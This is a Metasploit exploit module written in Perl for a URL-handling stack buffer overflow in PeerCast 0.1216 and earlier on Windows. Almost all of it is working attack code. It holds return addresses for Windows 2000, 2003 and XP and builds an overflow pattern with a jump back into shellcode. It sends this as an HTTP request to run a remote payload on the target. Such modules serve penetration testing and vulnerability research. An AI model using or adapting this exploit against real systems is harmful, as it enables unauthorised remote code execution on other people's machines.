PeerCast <= 0.1216 Remote Buffer Overflow Exploit (win32) (meta)
================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::peercast_url_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	&#039;Name&#039;  => &#039;PeerCast <= 0.1216 URL Handling Buffer Overflow(win32)&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.2 $&#039;,
	&#039;Authors&#039; => [ &#039;H D Moore <hdm [at] metasploit.com>&#039;, ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039; ],
	&#039;Priv&#039;  => 0,
	
	&#039;AutoOpts&#039;	=> { &#039;EXITFUNC&#039; => &#039;process&#039; },

	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 7144],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 400,
		&#039;BadChars&#039;  => "\x00\x0a\x0d\x20\x0d",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
		&#039;Prepend&#039;   => "\x81\xc4\x54\xf2\xff\xff",  # add esp, -3500
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in PeerCast <= v0.1216. 
	The vulnerability is caused due to a boundary error within the
	handling of URL parameters.
}),

	&#039;Refs&#039;  =>
	  [
	  	[&#039;OSVDB&#039;, &#039;23777&#039;],
		[&#039;BID&#039;, &#039;17040&#039;],
		[&#039;URL&#039;, &#039;http://www.infigo.hr/in_focus/INFIGO-2006-03-01&#039;],
	  ],

	&#039;Targets&#039; =>
	  [
		[&#039;Windows 2000 English SP0-SP4&#039;, 0x75023360 ],
		[&#039;Windows 2003 English SP0-SP1&#039;, 0x77d099e3 ],
		[&#039;Windows XP English SP0/SP1&#039;, 0x77dbfa2c],
		[&#039;Windows XP English SP0/SP2&#039;, 0x77dc12b8],
	  ],

	&#039;Keys&#039; => [&#039;peercast&#039;],

	&#039;DisclosureDate&#039; => &#039;March 8 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $offset      = $self->GetVar(&#039;OFFSET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target = $self->Targets->[$target_idx];

	my $pattern = Pex::Text::AlphaNumText(1024);
	
	# Return to EDI (offset 812)
	substr($pattern, 768, 4, pack(&#039;V&#039;, $target->[1]));
	
	# Jump back to the shellcode
	substr($pattern, 812, 5, "\xe9".pack("V", -517));
	
	# Insert he payload at offset 300 to avoid corruption
	substr($pattern, 300, length($shellcode), $shellcode);
	
	my $sploit = "GET /stream/?". $pattern ." HTTP/1.0\r\n\r\n";
	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;


